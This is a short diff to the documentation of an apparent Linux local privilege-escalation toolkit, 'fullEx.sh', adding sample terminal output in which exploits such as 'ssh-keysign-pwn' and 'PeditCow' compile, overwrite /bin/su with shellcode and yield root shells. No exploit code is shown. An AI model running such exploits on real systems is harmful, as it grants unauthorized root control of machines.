@@ -316,6 +316,9 @@ uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
 
 ```
 user@debian:~/fullEx$ ./fullEx.sh -SKP
+[+] Compilation successfuly !
+[+] PATH=/home/user/fullEx/exploit/ssh-keysign-pwn/skp
+[+] Executing the binary...
 # alive: EPERM on fd 3
 
 # id
@@ -327,7 +330,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(user)
 ```
 user@debian:~/fullEx$ ./fullEx.sh -PeditCow
 [+] Compilation successfuly !
-[+] PATH=/home/user/fullEx/exploit/PeditCow/a.out
+[+] PATH=/home/user/fullEx/exploit/PeditCow/peditcow
 [+] Executing the binary...
 [*] target /bin/su as uid 1001; entry at file offset 0x4330; shellcode 48 bytes
 [+] su entry overwritten; exec'ing su -> interactive root shell
